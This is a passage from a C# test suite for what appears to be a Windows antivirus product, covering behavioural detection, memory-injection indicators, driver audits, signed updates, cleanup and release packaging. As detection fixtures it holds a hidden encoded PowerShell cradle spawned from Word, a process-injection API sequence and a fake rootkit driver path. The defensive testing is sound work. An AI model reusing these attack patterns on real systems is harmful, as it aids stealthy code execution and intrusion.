            parentProcessName: "WINWORD.EXE",
            childProcessName: "powershell.exe",
            childCommandLine: "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AA==");
        Assert.True(macroSpawn.IsSuspiciousSpawnChain);
        Assert.True(macroSpawn.BehavioralRiskScore >= 90);
        Assert.True(macroSpawn.CanRequestUserApprovedTermination);
        Assert.Contains(macroSpawn.MatchedBehavioralRules, r => r.Contains("BEHAVIOR_PARENT_CHILD_LOLBIN"));
        Assert.Contains(macroSpawn.MatchedBehavioralRules, r => r.Contains("BEHAVIOR_OBFUSCATED_OR_CRADLE_CMD"));

        var normalSpawn = inspector.EvaluateParentChildProcessBehavior(
            parentProcessName: "explorer.exe",
            childProcessName: "notepad.exe",
            childCommandLine: "notepad.exe C:\\Users\\Kiron\\Desktop\\notes.txt");
        Assert.False(normalSpawn.IsSuspiciousSpawnChain);
        Assert.Equal(0, normalSpawn.BehavioralRiskScore);

        // 2. Memory & Loaded Module Scanning (Untrusted Temp DLL + Process Injection API Markers + System Process Safety)
        var hollowingScan = inspector.ScanProcessMemoryAndModuleIndicators(
            processId: 6820,
            processName: "invoice_viewer.exe",
            loadedModulePaths: new[]
            {
                @"C:\Windows\System32\ntdll.dll",
                @"C:\Users\Public\AppData\Local\Temp\stage2_reflective.dll"
            },
            inspectableMemoryOrCommandBuffer: "API sequence: VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread");
        Assert.False(hollowingScan.IsProtectedSystemProcess);
        Assert.True(hollowingScan.CanRequestUserApprovedTermination);
        Assert.Single(hollowingScan.UntrustedTempOrPublicModules);
        Assert.Equal(3, hollowingScan.DetectedMemoryInjectionIndicators.Count);
        Assert.True(hollowingScan.MemoryAndModuleRiskScore >= 90);

        var protectedLsassScan = inspector.ScanProcessMemoryAndModuleIndicators(
            processId: 640,
            processName: "lsass.exe",
            loadedModulePaths: new[] { @"C:\Windows\System32\lsasrv.dll" },
            inspectableMemoryOrCommandBuffer: null);
        Assert.True(protectedLsassScan.IsProtectedSystemProcess);
        Assert.False(protectedLsassScan.CanRequestUserApprovedTermination);
        Assert.Equal(0, protectedLsassScan.MemoryAndModuleRiskScore);

        // 3. Rootkit Detection Foundation (Anomalous Temp Kernel Driver Path vs Legitimate System32 Driver + Honest Planned State)
        var anomalousDriver = inspector.AuditDriverAndServicePersistencePath(
            serviceOrDriverName: "kp_fake_rootkit_drv",
            binaryImagePath: @"C:\Users\Public\AppData\Local\Temp\hidden_hook.sys",
            isKernelDriverEntry: true);
        Assert.True(anomalousDriver.IsAnomalousPersistencePath);
        Assert.True(anomalousDriver.PersistenceRiskScore >= 80);
        Assert.Equal("Enabled", anomalousDriver.UserModeAuditState);
        Assert.Contains("Planned", anomalousDriver.KernelLevelRootkitRemovalState, StringComparison.OrdinalIgnoreCase);

        var cleanDriver = inspector.AuditDriverAndServicePersistencePath(
            serviceOrDriverName: "WdFilter",
            binaryImagePath: @"C:\Windows\System32\drivers\WdFilter.sys",
            isKernelDriverEntry: true);
        Assert.False(cleanDriver.IsAnomalousPersistencePath);
        Assert.Equal(0, cleanDriver.PersistenceRiskScore);

        // 4. Exploit Protection Foundation (Read-Only Audit of DEP, ASLR, SEHOP, UAC)
        var exploitBaseline = inspector.AuditExploitMitigationBaseline(
            is64BitProcess: true,
            depPermanentFor64Bit: true,
            aslrMandatoryOrBottomUpEnabled: true,
            sehopEnabled: true,
            uacConsentPromptEnabled: true);
        Assert.True(exploitBaseline.DepHardwareNxEnforced);
        Assert.True(exploitBaseline.AslrAddressSpaceRandomizationEnabled);
        Assert.True(exploitBaseline.SehopStructuredExceptionProtectionEnabled);
        Assert.True(exploitBaseline.UacElevationPromptEnabled);
        Assert.Equal(4, exploitBaseline.EnabledMitigationCount);
        Assert.Equal("HARDENED_WINDOWS_EXPLOIT_BASELINE", exploitBaseline.OverallExploitPosture);

        // 5. Advanced Threat Scoring (Explainable Multi-Layer Composite Score 0–100)
        var layeredThreat = inspector.ComputeExplainableLayeredThreatScore(
            staticFileScore: 45,
            behavioralParentChildScore: macroSpawn.BehavioralRiskScore,
            memoryAndModuleScore: hollowingScan.MemoryAndModuleRiskScore,
            persistenceOrDriverScore: anomalousDriver.PersistenceRiskScore);
        Assert.Equal(100, layeredThreat.CompositeThreatScore);
        Assert.Equal("HighConfidenceThreat", layeredThreat.Classification);
        Assert.Equal(4, layeredThreat.ContributingRuleFactors.Count);
        Assert.Contains("Quarantine", layeredThreat.RecommendedResponse, StringComparison.OrdinalIgnoreCase);

        var cleanScore = inspector.ComputeExplainableLayeredThreatScore(0, 0, 0, 0);
        Assert.Equal(0, cleanScore.CompositeThreatScore);
        Assert.Equal("Clean", cleanScore.Classification);
        Assert.Empty(cleanScore.ContributingRuleFactors);
    }

    // =========================================================================
    // 30. PHASE 6 CLOUD & PRIVACY: SIGNED SECURITY UPDATES, UPDATE ROLLBACK,
    //     PRIVACY DASHBOARD, SYSTEM CLEANUP & SECURITY REPORTS
    // =========================================================================
    [Fact]
    public async Task Test30_Phase6CloudAndPrivacy_Rsa2048SignedUpdates_AtomicUpdateRollback_PrivacyDashboard_ConsentEnforcedCleanup_And_CsvJsonDispositionReports()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test30_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            // 1. Signed Security Updates (RSA-2048 SHA-256 Signature Verification + HTTPS + SHA-256 Digest + Offline-Safe Mode)
            var updateMgr = new SecureUpdateManager(Path.Combine(tempRoot, "Updates"));
            var (offlineSafe, offlineAvail, offlineNote) = updateMgr.EvaluateOfflineSafeUpdateStatus("1.0.0", null, isNetworkConnected: false);
            Assert.True(offlineSafe);
            Assert.False(offlineAvail);
            Assert.Contains("OFFLINE_SAFE_ACTIVE", offlineNote);

            byte[] v1Payload = System.Text.Encoding.UTF8.GetBytes("{\"definitions_version\":\"2026.11.01\",\"rules\":42}");
            byte[] v2Payload = System.Text.Encoding.UTF8.GetBytes("{\"definitions_version\":\"2026.11.24\",\"rules\":64}");
            string v2Sha256 = Convert.ToHexString(System.Security.Cryptography.SHA256.HashData(v2Payload)).ToLowerInvariant();

            using var rsa = System.Security.Cryptography.RSA.Create(2048);
            string rsaSigBase64 = SecureUpdateManager.SignPayloadRsa2048Sha256(v2Payload, rsa);
            Assert.True(SecureUpdateManager.VerifyRsa2048Sha256Signature(v2Payload, rsaSigBase64, rsa));
            Assert.False(SecureUpdateManager.VerifyRsa2048Sha256Signature(v1Payload, rsaSigBase64, rsa));

            string targetDefsFile = Path.Combine(tempRoot, "definitions.json");
            await File.WriteAllBytesAsync(targetDefsFile, v1Payload);

            var validManifest = new UpdateManifestPackage(
                ComponentId: "THREAT_INTELLIGENCE",
                Version: "2026.11.24",
                DownloadUrl: "https://github.com/fenibdnew/KIRON-PROHORI/releases/download/v1.0.0/definitions.json",
                ExpectedSha256: v2Sha256,
                PublisherIdentity: SecureUpdateManager.TrustedPublisherIdentity,
                DigitalSignatureBase64: rsaSigBase64,
                PublishedAtUtc: DateTimeOffset.UtcNow
            );

            var installRecord = await updateMgr.VerifyAndApplyUpdateAsync(
                validManifest,
                v2Payload,
                targetDefsFile,
                currentVersion: "2026.11.01");
            Assert.Equal("VERIFIED_AND_INSTALLED", installRecord.Status);
            Assert.Equal(v2Sha256, installRecord.VerificationHash);
            Assert.True(File.Exists(targetDefsFile + ".known_good"));

            // 2. Update Rollback (Atomic restoration of previous .known_good definitions)
            var rollbackRecord = await updateMgr.RollbackToPreviousVersionAsync(
                componentId: "THREAT_INTELLIGENCE",
                targetInstallFilePath: targetDefsFile,
                currentVersion: "2026.11.24",
                previousVersion: "2026.11.01");
            Assert.Equal("ROLLED_BACK", rollbackRecord.Status);
            Assert.Equal("2026.11.01", rollbackRecord.TargetVersion);
            string restoredContent = await File.ReadAllTextAsync(targetDefsFile);
            Assert.Contains("2026.11.01", restoredContent);

            // 3. Privacy Dashboard (Zero-Telemetry Default, Zero Automatic File Upload, Honest Read-Only Disclosure)
            var privacyMonitor = new PrivacyProtectionMonitor();
            var privacySummary = privacyMonitor.GetPrivacyDashboardSummary();
            Assert.False(privacySummary.TelemetryCollectedByDefault);
            Assert.False(privacySummary.AutomaticFileUploadEnabled);
            Assert.Contains("read-only", privacySummary.HonestUserModeDisclosure, StringComparison.OrdinalIgnoreCase);

            // 4. System Cleanup (Preview Reclaimable Temp Files, Protect Browser Credentials/Documents, Require Explicit Approval)
            var cleanupInspector = new SystemCleanupPreviewInspector();
            Assert.True(SystemCleanupPreviewInspector.IsProtectedPersonalOrBrowserCredentialPath(@"C:\Users\Kiron\Documents\TaxReturn.pdf"));
            Assert.True(SystemCleanupPreviewInspector.IsProtectedPersonalOrBrowserCredentialPath(@"C:\Users\Kiron\AppData\Local\Google\Chrome\User Data\Default\Login Data"));

            string safeTempDir = Path.Combine(tempRoot, "TempCleanupTest");
            Directory.CreateDirectory(safeTempDir);
            string tempArtifact = Path.Combine(safeTempDir, "updater_cache_01.tmp");
            await File.WriteAllTextAsync(tempArtifact, "safe reclaimable temporary cache");

            var cleanupPreview = cleanupInspector.BuildSafeTempCleanupPreview(safeTempDir);
            Assert.Equal(1, cleanupPreview.CandidateTempFileCount);
            Assert.True(cleanupPreview.PreservesBrowserPasswordsCookiesAndDocuments);
            Assert.Throws<InvalidOperationException>(() =>
                cleanupInspector.ExecuteUserApprovedTempCleanup(cleanupPreview.SampleCandidatePaths, userApproved: false)
            );
            int cleanedCount = cleanupInspector.ExecuteUserApprovedTempCleanup(cleanupPreview.SampleCandidatePaths, userApproved: true);
            Assert.Equal(1, cleanedCount);
            Assert.False(File.Exists(tempArtifact));

            // 5. Security Reports (Separated Dispositions + CSV & JSON Disk Export)
            var auditRepo = new LocalSecurityAuditRepository(Path.Combine(tempRoot, "phase6-audit.json"));
            await auditRepo.AppendAuditRecordAsync(
                "MODULE_02_SCANNER", "THREAT_DETECTED", "Trojan.Dropper.FakeAI", @"C:\Temp\sora_setup.exe",
                "aaaa1111", ThreatLifecycleDisposition.Detected, "KironProhori.HeuristicEngine", "Detected suspicious dropper.");
            await auditRepo.AppendAuditRecordAsync(
                "MODULE_06_WEB_GUARD", "PHISHING_BLOCKED", "Phishing.Portal.Verify", "https://phishing-login-verify.kiron-test.invalid",
                "bbbb2222", ThreatLifecycleDisposition.Blocked, "KironProhori.NativeMessagingGuard", "Blocked phishing navigation.");
            await auditRepo.AppendAuditRecordAsync(
                "MODULE_04_QUARANTINE", "THREAT_QUARANTINED", "EICAR-Test-File", @"C:\Downloads\eicar.com",
                "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", ThreatLifecycleDisposition.Quarantined, "KironProhori.Sha256HashEngine", "Isolated in .kpq vault.");
            await auditRepo.AppendAuditRecordAsync(
                "MODULE_04_QUARANTINE", "THREAT_REMOVED", "Worm.USB.Autorun", @"E:\Autorun.inf",
                "cccc3333", ThreatLifecycleDisposition.Removed, "KironProhori.QuarantineManager", "Permanently removed with user confirmation.");

            var breakdown = auditRepo.GetDispositionSummaryBreakdown();
            Assert.Equal(4, breakdown.TotalAuditRecords);
            Assert.Equal(1, breakdown.DetectedCount);
            Assert.Equal(1, breakdown.BlockedCount);
            Assert.Equal(1, breakdown.QuarantinedCount);
            Assert.Equal(1, breakdown.RemovedCount);
            Assert.Equal(0, breakdown.UnresolvedCount);

            var (csvFile, jsonFile) = await auditRepo.ExportReportsToDirectoryAsync(Path.Combine(tempRoot, "Exports"));
            Assert.True(File.Exists(csvFile));
            Assert.True(File.Exists(jsonFile));
            string exportedCsv = await File.ReadAllTextAsync(csvFile);
            Assert.Contains("Quarantined", exportedCsv);
            Assert.Contains("Removed", exportedCsv);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 31. PHASE 7 QUALITY ASSURANCE: UNIT & INTEGRATION PIPELINE, WINDOWS 10/11
    //     COMPATIBILITY, PERFORMANCE BENCHMARK, SECURITY REVIEW, INSTALLATION &
    //     UNINSTALLATION TESTS
    // =========================================================================
    [Fact]
    public async Task Test31_Phase7QualityAssurance_UnitAndIntegrationPipeline_WindowsCompatibilityMatrix_PerformanceThroughput_SecurityReview_And_InstallUninstallAudit()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test31_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            var exclusionMgr = new ExclusionManager(Path.Combine(tempRoot, "Exclusions"));
            var quarantineMgr = new QuarantineManager(Path.Combine(tempRoot, "Quarantine"), exclusionMgr);
            var notifyMgr = new SmartNotificationManager();
            var perfGuard = new PerformanceProtectionGuard();
            var pipeline = new ModularScanPipeline(null, exclusionMgr, perfGuard, notifyMgr);
            var auditRepo = new LocalSecurityAuditRepository(Path.Combine(tempRoot, "phase7-audit.json"));
            var procInspector = new ProcessAndMemorySecurityInspector();
            var qaAuditor = new Phase7QualityAssuranceAuditor();

            // 1. Unit & End-to-End Integration Test (Scan -> EICAR Detection -> Quarantine -> Audit Log -> Restore)
            string eicarPath = Path.Combine(tempRoot, "phase7_eicar.com");
            await File.WriteAllTextAsync(eicarPath, Sha256HashEngine.EicarStandardString);

            var scanSession = await pipeline.ExecuteScanAsync(
                ScanType.SingleFileScan,
                new[] { eicarPath });
            Assert.Single(scanSession.Detections);
            Assert.Equal("EICAR-Standard-AntiVirus-Test-File", scanSession.Detections[0].ThreatName);

            var qRecord = await quarantineMgr.QuarantineFileAsync(scanSession.Detections[0]);
            Assert.False(File.Exists(eicarPath));
            await auditRepo.AppendAuditRecordAsync(
                "MODULE_04_QUARANTINE", "QA_INTEGRATION_QUARANTINE", qRecord.ThreatName,
                qRecord.OriginalFilePath, qRecord.Sha256Hash, ThreatLifecycleDisposition.Quarantined,
                "KironProhori.QuarantineManager", "Phase 7 end-to-end integration test.");
            Assert.Single(auditRepo.GetRecords(ThreatLifecycleDisposition.Quarantined));

            bool restored = await quarantineMgr.RestoreQuarantinedFileAsync(qRecord.QuarantineId, addToExclusions: false);
            Assert.True(restored);
            Assert.True(File.Exists(eicarPath));

            // 2. Windows 10 (x86/x64) & Windows 11 (x64) Compatibility Matrix Verification
            var win10x86 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.19045", 10, 19045,
                System.Runtime.InteropServices.Architecture.X86,
                System.Runtime.InteropServices.Architecture.X86, is64BitOs: false);
            var win10x64 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.19045", 10, 19045,
                System.Runtime.InteropServices.Architecture.X64,
                System.Runtime.InteropServices.Architecture.X64, is64BitOs: true);
            var win11x64 = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.22631", 10, 22631,
                System.Runtime.InteropServices.Architecture.X64,
                System.Runtime.InteropServices.Architecture.X64, is64BitOs: true);
            var win11x86Unsupported = WindowsPlatformCompatibilityDetector.EvaluatePlatformCompatibility(
                "Microsoft Windows 10.0.22631", 10, 22631,
                System.Runtime.InteropServices.Architecture.X86,
                System.Runtime.InteropServices.Architecture.X86, is64BitOs: false);

            Assert.True(win10x86.IsSupportedWindowsConfiguration);
            Assert.True(win10x64.IsSupportedWindowsConfiguration);
            Assert.True(win11x64.IsSupportedWindowsConfiguration);
            Assert.False(win11x86Unsupported.IsSupportedWindowsConfiguration);

            // 3. Performance Benchmark Test (64 KB Streaming SHA-256 + Unchanged Clean File Cache Speedup)
            string perfFile = Path.Combine(tempRoot, "perf_benchmark_1mb.bin");
            byte[] oneMbBuffer = new byte[1024 * 1024];
            new Random(42).NextBytes(oneMbBuffer);
            await File.WriteAllBytesAsync(perfFile, oneMbBuffer);

            var sw = System.Diagnostics.Stopwatch.StartNew();
            string digest = await Sha256HashEngine.ComputeFileSha256Async(perfFile);
            sw.Stop();
            Assert.Equal(64, digest.Length);
            Assert.True(sw.ElapsedMilliseconds < 2500, $"1 MB streaming SHA-256 took {sw.ElapsedMilliseconds}ms");

            var perfFileInfo = new FileInfo(perfFile);
            Assert.False(perfGuard.CanSkipUnchangedCleanFile(perfFileInfo));
            perfGuard.RecordCleanFile(perfFileInfo);
            Assert.True(perfGuard.CanSkipUnchangedCleanFile(perfFileInfo));

            // 4. Security Review Compliance Audit
            var secReview = qaAuditor.RunComprehensiveSecurityReview(quarantineMgr, procInspector);
            Assert.True(secReview.ZeroPaidApiDependencyVerified);
            Assert.True(secReview.ZeroDefaultTelemetryVerified);
            Assert.True(secReview.DefenderAndFirewallCoexistenceVerified);
            Assert.True(secReview.QuarantinePathTraversalGuardVerified);
            Assert.True(secReview.CriticalSystemProcessProtectionVerified);
            Assert.True(secReview.HttpsAndSignedUpdatePolicyVerified);
            Assert.True(secReview.AllSecurityReviewControlsPassed);

            // 5. Installation & Uninstallation Contract Verification (Inno Setup KironProhoriSetup.iss)
            string sampleIssContent = @"
MinVersion=10.0.19041
PrivilegesRequired=admin
Root: HKCR; Subkey: ""Drive\shell\KironProhoriScan""
Root: HKCR; Subkey: ""Directory\shell\KironProhoriScan""
Root: HKCR; Subkey: ""*\shell\KironProhoriScan""
ValueData: """"""{app}\KironProhori.Desktop.exe"""" --scan-path """"%1""""""
Filename: ""sc.exe""; Parameters: ""create KironProhoriSecurityService start= delayed-auto""
Filename: ""sc.exe""; Parameters: ""stop KironProhoriSecurityService""; RunOnceId: ""StopKironService""
Filename: ""sc.exe""; Parameters: ""delete KironProhoriSecurityService""; RunOnceId: ""DeleteKironService""
procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
UserDataDir := ExpandConstant('{localappdata}\KironProhori');
MB_YESNO or MB_DEFBUTTON1
";
            var installAudit = qaAuditor.AuditInnoSetupInstallerScript(sampleIssContent);
            Assert.True(installAudit.EnforcesWindows10Build19041Minimum);
            Assert.True(installAudit.EnforcesAdminPrivileges);
            Assert.True(installAudit.RegistersDelayedAutoServiceWithCrashRecovery);
            Assert.True(installAudit.RegistersDriveDirectoryAndFileContextMenus);
            Assert.True(installAudit.StopsAndRemovesServiceOnUninstall);
            Assert.True(installAudit.PromptsUserConsentForQuarantinePreservationOnUninstall);
            Assert.True(installAudit.AllInstallAndUninstallChecksPassed);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    // =========================================================================
    // 32. PHASE 8 RELEASE: WINDOWS x86 & x64 BUILD TARGETS, RELEASE PACKAGES,
    //     INSTALLER & UNINSTALLER, SHA-256 CHECKSUMS, RELEASE NOTES & GITHUB
    //     RELEASE AUTOMATION
    // =========================================================================
    [Fact]
    public async Task Test32_Phase8Release_WindowsX86AndX64BuildTargets_ReleasePackages_Sha256Checksums_ReleaseNotes_And_GitHubReleaseAutomation()
    {
        var tempRoot = Path.Combine(Path.GetTempPath(), $"kp_test32_{Guid.NewGuid():N}");
        Directory.CreateDirectory(tempRoot);

        try
        {
            var releaseMgr = new Phase8ReleasePackagingManager();

            // 1. Windows x86 (Windows 10) and Windows x64 (Windows 10 & 11) Build Target Matrix
            var targets = releaseMgr.GetSupportedReleaseBuildTargets();
            Assert.Equal(2, targets.Count);

            var x64Target = targets.First(t => t.RuntimeIdentifier == "win-x64");
            Assert.True(x64Target.IsSupportedForWindows10);
            Assert.True(x64Target.IsSupportedForWindows11);
            Assert.Equal("KIRON-PROHORI-Setup-x64.exe", x64Target.PrimaryInstallerPackage);

            var x86Target = targets.First(t => t.RuntimeIdentifier == "win-x86");
            Assert.True(x86Target.IsSupportedForWindows10);
            Assert.False(x86Target.IsSupportedForWindows11);
            Assert.Equal("KIRON-PROHORI-Portable-win-x86.zip", x86Target.PortableArchivePackage);

            // 2. Release Packages & Cryptographic SHA-256 Checksum Manifest (SHA256SUMS.txt)
            var releaseArtifacts = new[]
            {
                "KIRON-PROHORI-Setup-x64.exe",
                "KIRON-PROHORI-Portable-win-x64.zip",
                "KIRON-PROHORI-Portable-win-x86.zip",
                "KIRON-PROHORI-Browser-Extension-MV3.zip",
                "Release-Notes.txt"
            };

            foreach (var artifact in releaseArtifacts)
            {
                await File.WriteAllTextAsync(Path.Combine(tempRoot, artifact), $"Verified release artifact payload for {artifact}");
            }

            string sha256SumsPath = await releaseMgr.GenerateSha256SumsManifestAsync(tempRoot, releaseArtifacts);
            Assert.True(File.Exists(sha256SumsPath));

            var (allVerified, verifiedFiles, failedFiles) = await releaseMgr.VerifySha256SumsManifestAsync(tempRoot, sha256SumsPath);
            Assert.True(allVerified);
            Assert.Equal(5, verifiedFiles.Count);
            Assert.Empty(failedFiles);

            // Tamper with one artifact and confirm SHA256SUMS verifier immediately catches the mismatch
            await File.WriteAllTextAsync(Path.Combine(tempRoot, "KIRON-PROHORI-Portable-win-x86.zip"), "tampered archive bytes");
            var (tamperedOk, _, tamperedFailed) = await releaseMgr.VerifySha256SumsManifestAsync(tempRoot, sha256SumsPath);
            Assert.False(tamperedOk);
            Assert.Contains(tamperedFailed, f => f.Contains("KIRON-PROHORI-Portable-win-x86.zip"));

            // 3. Release Notes & GitHub Release Automation Pipeline Verification
            string sampleWorkflowYaml = @"
dotnet publish -c Release -r win-x64 --self-contained true
dotnet publish -c Release -r win-x86 --self-contained true
if ($Channel -eq 'STABLE_V1_0' -and -not $HasProdCert) { WINDOWS_SIGNING_CERT_THUMBPRINT }
& $IsccPath 'desktop-agent/installer/inno-setup/KironProhoriSetup.iss'
Copy-Item 'desktop-agent/artifacts/installer/KIRON-PROHORI-Setup-x64.exe'
Get-FileHash -Algorithm SHA256 -> SHA256SUMS.txt
uses: softprops/action-gh-release@v2
";
            string sampleReleaseNotes = @"
Product Name : KIRON PROHORI
Developer    : ARIFUZZAMAN KIRON
Verify SHA-256 in SHA256SUMS.txt
";
            var pipelineAudit = releaseMgr.AuditGitHubReleaseWorkflowAndNotes(sampleWorkflowYaml, sampleReleaseNotes);
            Assert.True(pipelineAudit.PublishesWindowsX64Build);
            Assert.True(pipelineAudit.PublishesWindows10X86PortableBuild);
            Assert.True(pipelineAudit.EnforcesStableV1AuthenticodeSigningGate);
            Assert.True(pipelineAudit.CompilesInnoSetupInstallerAndUninstaller);
            Assert.True(pipelineAudit.GeneratesCryptographicSha256SumsManifest);
            Assert.True(pipelineAudit.AutomatesGitHubReleasePublication);
            Assert.True(pipelineAudit.ReleaseNotesVerified);
            Assert.True(pipelineAudit.IsReadyForGitHubReleaseV1);
        }
        finally
        {
            Directory.Delete(tempRoot, recursive: true);
        }
    }

    private sealed class SynchronousProgress : IProgress<ScanProgressUpdate>
    {
        private readonly List<ScanProgressUpdate> _sink;
        public SynchronousProgress(List<ScanProgressUpdate> sink) => _sink = sink;
        public void Report(ScanProgressUpdate value) => _sink.Add(value);
    }
}

